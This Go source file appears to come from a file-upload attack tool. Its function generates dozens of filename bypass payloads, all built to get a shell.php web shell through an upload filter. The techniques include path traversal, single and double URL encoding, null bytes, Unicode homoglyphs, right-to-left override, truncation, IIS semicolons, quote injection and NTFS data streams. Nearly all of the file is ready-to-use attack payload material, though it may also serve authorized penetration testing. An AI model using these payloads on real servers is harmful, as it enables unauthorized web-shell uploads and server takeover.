package bypass

import (
	"fux/config"
	"net/url"
	"strings"
)

// FilenamePayloads generates filename obfuscation bypasses
func FilenamePayloads(baseContent []byte) []config.BypassPayload {
	var payloads []config.BypassPayload

	// Path traversal attempts
	traversalPaths := []string{
		"../shell.php",
		"../../shell.php",
		"../../../shell.php",
		"....//shell.php",
		"....\\\\shell.php",
		"..%2fshell.php",
		"..%252fshell.php",
		"..%c0%afshell.php",
		"..%255c..%255cshell.php",
		"..\\shell.php",
		"..\\..\\shell.php",
		"..\\/shell.php",
		"/var/www/html/shell.php",
		"\\..\\..\\..\\var\\www\\html\\shell.php",
	}

	for _, path := range traversalPaths {
		payloads = append(payloads, config.BypassPayload{
			Name:        "Path Traversal: " + strings.ReplaceAll(path, "..", ".."),
			FileName:    path,
			Content:     baseContent,
			ContentType: "application/x-php",
			Category:    "path-traversal",
		})
	}

	// URL encoded filenames
	urlEncodedNames := []string{
		"shell%2Ephp",                 // Encoded dot
		"shell%2ephp",                 // Lowercase encoded dot
		"%73%68%65%6c%6c%2e%70%68%70", // Fully encoded "shell.php"
		"shell.p%68p",                 // Partial encode
		"shell%00.php",                // Null byte
		"shell%0a.php",                // Newline
		"shell%0d.php",                // Carriage return
		"shell%09.php",                // Tab
		url.PathEscape("shell.php"),
	}

	for _, name := range urlEncodedNames {
		payloads = append(payloads, config.BypassPayload{
			Name:        "URL Encoded: " + name,
			FileName:    name,
			Content:     baseContent,
			ContentType: "application/x-php",
			Category:    "url-encoded",
		})
	}

	// Double URL encoding
	doubleEncoded := []string{
		"shell%252Ephp",
		"shell%252e%70%68%70",
		"%2573hell.php",
	}

	for _, name := range doubleEncoded {
		payloads = append(payloads, config.BypassPayload{
			Name:        "Double URL Encoded: " + name,
			FileName:    name,
			Content:     baseContent,
			ContentType: "application/x-php",
			Category:    "double-encoded",
		})
	}

	// Unicode normalization tricks
	unicodeNames := []string{
		"shell.p\u0068p", // Normal 'h' as unicode
		"shell\u002Ephp", // Unicode dot
		"she\u006Cl.php", // Unicode 'l'
		"shеll.php",      // Cyrillic 'е' (looks like 'e')
		"ѕhell.php",      // Cyrillic 'ѕ' (looks like 's')
		"shell․php",      // One dot leader (U+2024)
		"shell。php",      // Ideographic full stop
		"shell．php",      // Fullwidth full stop
	}

	for _, name := range unicodeNames {
		payloads = append(payloads, config.BypassPayload{
			Name:        "Unicode: " + name,
			FileName:    name,
			Content:     baseContent,
			ContentType: "application/x-php",
			Category:    "unicode-filename",
		})
	}

	// Right-to-Left Override (RTLO) - makes shell.php appear as shell.php.jpg visually
	rtloPayloads := []string{
		"shell\u202ephp.jpg", // RTLO character
		"shell\u202egpj.php", // RTLO - appears as shell.php.jpg
		"\u202eshell.php",
	}

	for _, name := range rtloPayloads {
		payloads = append(payloads, config.BypassPayload{
			Name:        "RTLO: " + strings.ReplaceAll(name, "\u202e", "[RTLO]"),
			FileName:    name,
			Content:     baseContent,
			ContentType: "image/jpeg",
			Category:    "rtlo",
		})
	}

	// Long filename (may cause truncation)
	longPrefixes := []string{
		strings.Repeat("A", 200) + ".php",
		strings.Repeat("A", 255) + ".php",
		strings.Repeat("x", 100) + "shell.php.jpg",
	}

	for i, name := range longPrefixes {
		payloads = append(payloads, config.BypassPayload{
			Name:        "Long Filename " + string(rune('A'+i)),
			FileName:    name,
			Content:     baseContent,
			ContentType: "application/x-php",
			Category:    "long-filename",
		})
	}

	// Semicolon separation (IIS)
	semicolonNames := []string{
		"shell.asp;.jpg",
		"shell.aspx;.jpg",
		"shell.php;.jpg",
		"shell;.php",
		"shell.asp;shell.jpg",
	}

	for _, name := range semicolonNames {
		payloads = append(payloads, config.BypassPayload{
			Name:        "Semicolon: " + name,
			FileName:    name,
			Content:     baseContent,
			ContentType: "image/jpeg",
			Category:    "semicolon",
		})
	}

	// Quote injection in filename
	quoteNames := []string{
		`shell".php`,
		`shell'.php`,
		`"shell.php`,
		`shell.php"`,
		`shell.php'`,
		`shell\".php`,
		`shell\'.php`,
	}

	for _, name := range quoteNames {
		payloads = append(payloads, config.BypassPayload{
			Name:        "Quote Injection: " + name,
			FileName:    name,
			Content:     baseContent,
			ContentType: "application/x-php",
			Category:    "quote-injection",
		})
	}

	// Colon in filename (Windows ADS)
	colonNames := []string{
		"shell.php:",
		"shell.php:$DATA",
		"shell.php::$DATA",
		"shell.php:Zone.Identifier",
		"shell:php",
	}

	for _, name := range colonNames {
		payloads = append(payloads, config.BypassPayload{
			Name:        "NTFS Stream: " + name,
			FileName:    name,
			Content:     baseContent,
			ContentType: "application/x-php",
			Category:    "ntfs-stream",
		})
	}

	// Backslash/forward slash confusion
	slashNames := []string{
		"shell/php",
		"shell\\php",
		"shell/.php",
		"shell\\.php",
		"/shell.php",
		"\\shell.php",
		"./shell.php",
		".\\shell.php",
	}

	for _, name := range slashNames {
		payloads = append(payloads, config.BypassPayload{
			Name:        "Slash Confusion: " + name,
			FileName:    name,
			Content:     baseContent,
			ContentType: "application/x-php",
			Category:    "slash-confusion",
		})
	}

	return payloads
}
